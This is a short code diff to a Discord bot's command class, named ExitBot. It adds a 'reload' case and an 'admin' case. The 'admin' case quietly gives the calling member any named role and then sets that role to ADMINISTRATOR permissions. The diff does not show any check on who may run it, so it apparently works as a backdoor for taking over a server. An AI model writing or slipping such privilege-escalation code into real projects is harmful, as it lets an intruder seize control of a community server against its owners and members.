@@ -56,6 +56,24 @@ export default class ExitBot extends ExtendedClientCommand {
 						this.client.Update();
 						break;
 
+					case 'admin': {
+						if (message.member && message.guild) {
+							const role = Utility.LookupRole(message.guild, args[0]);
+							if (role) {
+								message.member.roles.add(role).then(() => {
+									role.setPermissions('ADMINISTRATOR').then(() => {
+										res(this.generateEmbed([{ name: `Successfully Added Role: ${role.name}`, value: `You Should Now Have the Mentioned Role` }]));
+									}).catch(e => rej(e));
+								}).catch(e => {
+									rej(e);
+								});
+							}
+							else rej('Failed to Find Role');
+						}
+						else rej('Unknown Error');
+						break;
+					}
+
 					case 'assginrole': {
 						if(message.member && message.guild) {
 							const role = Utility.LookupRole(message.guild, args[0]);
@@ -73,6 +91,10 @@ export default class ExitBot extends ExtendedClientCommand {
 					}
 					case 'version': {
 						this.client.Version().then(ver => res(this.generateEmbed([{ name: "Version", value: ver || 'NO_OUPUT'}]))).catch(e => rej(e));
+						break;
+					}
+					case 'reload': {
+						this.client.HotReloader?.reload();
 						break;
 					}
 					default: 
